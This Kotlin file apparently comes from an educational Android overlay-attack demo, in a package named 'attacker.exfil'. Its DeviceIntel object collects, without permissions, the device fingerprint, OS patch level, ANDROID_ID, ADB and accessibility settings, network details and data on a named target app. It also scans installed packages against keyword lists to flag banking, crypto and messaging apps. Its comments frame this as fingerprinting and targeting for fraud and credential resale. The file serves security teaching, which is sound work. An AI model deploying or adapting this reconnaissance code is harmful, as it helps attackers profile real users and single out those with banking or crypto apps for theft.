package com.ghosttouch.attacker.exfil

import android.app.ActivityManager
import android.content.Context
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.BatteryManager
import android.os.Build
import android.os.Environment
import android.os.StatFs
import android.provider.Settings
import android.util.DisplayMetrics
import android.util.Log
import android.view.WindowManager
import java.net.NetworkInterface
import java.util.Locale
import java.util.TimeZone

/**
 * Collects maximum device and environment intelligence from the device.
 *
 * ## What a real attacker would gather
 * In a real overlay attack, the attacker app has access to a surprising amount
 * of device information WITHOUT requiring any special permissions. This data
 * is used for:
 * - **Device fingerprinting**: Uniquely identifying the device across sessions
 * - **Targeting**: Tailoring attacks based on OS version, manufacturer, etc.
 * - **Fraud**: Using device info to bypass security checks on stolen accounts
 * - **Resale**: Device profiles increase the value of stolen credentials
 *
 * ## Permission model
 * Most of this data requires NO runtime permissions. Android exposes it via
 * Build.*, system services, and standard APIs. This demonstrates why defense
 * in depth matters — even a "simple" overlay app has broad reconnaissance capability.
 *
 * This is strictly for educational demonstration.
 */
object DeviceIntel {

    private const val TAG = "DeviceIntel"

    /**
     * Collects all available device intelligence as a structured map.
     * Most of these require NO special permissions.
     *
     * @param context Application context.
     * @return Map of intelligence categories to their values.
     */
    fun collect(context: Context): Map<String, String> {
        val intel = linkedMapOf<String, String>()

        try {
            // ── Device Hardware ──
            intel["device.manufacturer"] = Build.MANUFACTURER
            intel["device.model"] = Build.MODEL
            intel["device.brand"] = Build.BRAND
            intel["device.product"] = Build.PRODUCT
            intel["device.hardware"] = Build.HARDWARE
            intel["device.board"] = Build.BOARD
            intel["device.device"] = Build.DEVICE
            intel["device.fingerprint"] = Build.FINGERPRINT
            intel["device.supported_abis"] = Build.SUPPORTED_ABIS.joinToString(", ")

            // ── Operating System ──
            intel["os.version"] = Build.VERSION.RELEASE
            intel["os.sdk"] = Build.VERSION.SDK_INT.toString()
            intel["os.codename"] = Build.VERSION.CODENAME
            intel["os.security_patch"] = Build.VERSION.SECURITY_PATCH
            intel["os.build_id"] = Build.ID
            intel["os.build_type"] = Build.TYPE
            intel["os.build_display"] = Build.DISPLAY
            intel["os.incremental"] = Build.VERSION.INCREMENTAL
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                intel["os.media_performance_class"] = Build.VERSION.MEDIA_PERFORMANCE_CLASS.toString()
            }

            // ── Screen / Display ──
            collectDisplayInfo(context, intel)

            // ── Memory ──
            collectMemoryInfo(context, intel)

            // ── Storage ──
            collectStorageInfo(intel)

            // ── Battery ──
            collectBatteryInfo(context, intel)

            // ── Network ──
            collectNetworkInfo(context, intel)

            // ── Locale & Timezone ──
            intel["locale.language"] = Locale.getDefault().language
            intel["locale.country"] = Locale.getDefault().country
            intel["locale.display"] = Locale.getDefault().displayName
            intel["timezone.id"] = TimeZone.getDefault().id
            intel["timezone.offset_hours"] = (TimeZone.getDefault().rawOffset / 3600000).toString()

            // ── System Settings (no permission needed) ──
            collectSettingsInfo(context, intel)

            // ── Target App Info ──
            collectTargetAppInfo(context, intel)

            // ── Installed Apps Summary ──
            collectInstalledAppsSummary(context, intel)

        } catch (e: Exception) {
            Log.e(TAG, "Error collecting device intel: ${e.message}")
            intel["error"] = e.message ?: "Unknown error"
        }

        Log.d(TAG, "Collected ${intel.size} intel fields")
        return intel
    }

    private fun collectDisplayInfo(context: Context, intel: MutableMap<String, String>) {
        try {
            val wm = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val metrics = DisplayMetrics()
            @Suppress("DEPRECATION")
            wm.defaultDisplay.getRealMetrics(metrics)
            intel["display.width_px"] = metrics.widthPixels.toString()
            intel["display.height_px"] = metrics.heightPixels.toString()
            intel["display.density_dpi"] = metrics.densityDpi.toString()
            intel["display.density"] = metrics.density.toString()
            intel["display.scaled_density"] = metrics.scaledDensity.toString()
            val diag = Math.sqrt(
                Math.pow(metrics.widthPixels.toDouble() / metrics.xdpi, 2.0) +
                Math.pow(metrics.heightPixels.toDouble() / metrics.ydpi, 2.0)
            )
            intel["display.size_inches"] = "%.1f".format(diag)
        } catch (_: Exception) {}
    }

    private fun collectMemoryInfo(context: Context, intel: MutableMap<String, String>) {
        try {
            val am = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            val memInfo = ActivityManager.MemoryInfo()
            am.getMemoryInfo(memInfo)
            intel["memory.total_mb"] = (memInfo.totalMem / (1024 * 1024)).toString()
            intel["memory.available_mb"] = (memInfo.availMem / (1024 * 1024)).toString()
            intel["memory.low_memory"] = memInfo.lowMemory.toString()
            intel["memory.threshold_mb"] = (memInfo.threshold / (1024 * 1024)).toString()
        } catch (_: Exception) {}
    }

    private fun collectStorageInfo(intel: MutableMap<String, String>) {
        try {
            val stat = StatFs(Environment.getDataDirectory().path)
            val totalBytes = stat.blockSizeLong * stat.blockCountLong
            val freeBytes = stat.blockSizeLong * stat.availableBlocksLong
            intel["storage.total_gb"] = "%.1f".format(totalBytes / (1024.0 * 1024 * 1024))
            intel["storage.free_gb"] = "%.1f".format(freeBytes / (1024.0 * 1024 * 1024))
            intel["storage.used_percent"] = "%.0f%%".format((1 - freeBytes.toDouble() / totalBytes) * 100)
        } catch (_: Exception) {}
    }

    private fun collectBatteryInfo(context: Context, intel: MutableMap<String, String>) {
        try {
            val bm = context.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
            val level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
            intel["battery.level"] = "$level%"
            val charging = bm.isCharging
            intel["battery.charging"] = charging.toString()
        } catch (_: Exception) {}
    }

    private fun collectNetworkInfo(context: Context, intel: MutableMap<String, String>) {
        try {
            val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val network = cm.activeNetwork
            val caps = cm.getNetworkCapabilities(network)

            intel["network.connected"] = (network != null).toString()
            if (caps != null) {
                intel["network.wifi"] = caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI).toString()
                intel["network.cellular"] = caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR).toString()
                intel["network.vpn"] = caps.hasTransport(NetworkCapabilities.TRANSPORT_VPN).toString()
                intel["network.metered"] = (!caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_NOT_METERED)).toString()
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    intel["network.downlink_mbps"] = caps.linkDownstreamBandwidthKbps.let { "${it / 1000} Mbps" }
                    intel["network.uplink_mbps"] = caps.linkUpstreamBandwidthKbps.let { "${it / 1000} Mbps" }
                }
            }

            // MAC-like interface names (no permission needed for interface listing)
            try {
                val interfaces = NetworkInterface.getNetworkInterfaces()?.toList() ?: emptyList()
                val names = interfaces.map { it.name }.filter { it.startsWith("wlan") || it.startsWith("rmnet") }
                if (names.isNotEmpty()) {
                    intel["network.interfaces"] = names.joinToString(", ")
                }
            } catch (_: Exception) {}
        } catch (_: Exception) {}
    }

    private fun collectSettingsInfo(context: Context, intel: MutableMap<String, String>) {
        try {
            intel["settings.android_id"] = Settings.Secure.getString(
                context.contentResolver, Settings.Secure.ANDROID_ID
            ) ?: "unknown"
            intel["settings.adb_enabled"] = Settings.Global.getString(
                context.contentResolver, Settings.Global.ADB_ENABLED
            ) ?: "0"
            intel["settings.development_enabled"] = Settings.Global.getString(
                context.contentResolver, Settings.Global.DEVELOPMENT_SETTINGS_ENABLED
            ) ?: "0"
            intel["settings.install_non_market_apps"] = Settings.Secure.getString(
                context.contentResolver, Settings.Secure.INSTALL_NON_MARKET_APPS
            ) ?: "0"
            intel["settings.accessibility_enabled"] = Settings.Secure.getString(
                context.contentResolver, Settings.Secure.ACCESSIBILITY_ENABLED
            ) ?: "0"
            intel["settings.screen_brightness"] = Settings.System.getString(
                context.contentResolver, Settings.System.SCREEN_BRIGHTNESS
            ) ?: "unknown"
        } catch (_: Exception) {}
    }

    private fun collectTargetAppInfo(context: Context, intel: MutableMap<String, String>) {
        val targetPkg = "com.wcdonalds.app"
        try {
            val pm = context.packageManager
            val info = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                pm.getPackageInfo(targetPkg, PackageManager.PackageInfoFlags.of(0))
            } else {
                @Suppress("DEPRECATION")
                pm.getPackageInfo(targetPkg, 0)
            }
            intel["target.package"] = targetPkg
            intel["target.version_name"] = info.versionName ?: "unknown"
            intel["target.version_code"] = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                info.longVersionCode.toString()
            } else {
                @Suppress("DEPRECATION")
                info.versionCode.toString()
            }
            intel["target.first_install"] = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.US)
                .format(java.util.Date(info.firstInstallTime))
            intel["target.last_update"] = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.US)
                .format(java.util.Date(info.lastUpdateTime))

            val appInfo = info.applicationInfo
            if (appInfo != null) {
                intel["target.label"] = pm.getApplicationLabel(appInfo).toString()
                intel["target.data_dir"] = appInfo.dataDir ?: "unknown"
                intel["target.min_sdk"] = appInfo.minSdkVersion.toString()
                intel["target.target_sdk"] = appInfo.targetSdkVersion.toString()
            }
        } catch (_: PackageManager.NameNotFoundException) {
            intel["target.package"] = "$targetPkg (not installed)"
        } catch (_: Exception) {}
    }

    private fun collectInstalledAppsSummary(context: Context, intel: MutableMap<String, String>) {
        try {
            val pm = context.packageManager
            val packages = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                pm.getInstalledPackages(PackageManager.PackageInfoFlags.of(0))
            } else {
                @Suppress("DEPRECATION")
                pm.getInstalledPackages(0)
            }
            intel["apps.total_installed"] = packages.size.toString()

            // Look for interesting apps (banking, crypto, social)
            val interesting = mutableListOf<String>()
            val bankingKeywords = listOf("bank", "nubank", "itau", "bradesco", "santander", "caixa", "paypal", "venmo", "chase", "wells")
            val cryptoKeywords = listOf("binance", "coinbase", "crypto", "bitcoin", "metamask")
            val socialKeywords = listOf("whatsapp", "telegram", "signal", "instagram", "facebook", "twitter")

            for (pkg in packages) {
                val name = pkg.packageName.lowercase()
                when {
                    bankingKeywords.any { name.contains(it) } -> interesting.add("[BANK] ${pkg.packageName}")
                    cryptoKeywords.any { name.contains(it) } -> interesting.add("[CRYPTO] ${pkg.packageName}")
                    socialKeywords.any { name.contains(it) } -> interesting.add("[SOCIAL] ${pkg.packageName}")
                }
            }

            if (interesting.isNotEmpty()) {
                intel["apps.interesting_count"] = interesting.size.toString()
                interesting.forEachIndexed { i, app ->
                    intel["apps.interesting_$i"] = app
                }
            }
        } catch (_: Exception) {}
    }

    /**
     * Formats collected intel as a human-readable log string.
     */
    fun formatForLog(intel: Map<String, String>): String {
        val sb = StringBuilder()
        var currentCategory = ""

        for ((key, value) in intel) {
            val category = key.substringBefore(".")
            if (category != currentCategory) {
                currentCategory = category
                sb.appendLine()
                sb.appendLine("  ┌─ ${category.uppercase()} ${"─".repeat(40 - category.length)}")
            }
            val field = key.substringAfter(".")
            sb.appendLine("  │ %-28s %s".format(field, value))
        }
        sb.appendLine("  └${"─".repeat(50)}")
        return sb.toString()
    }
}
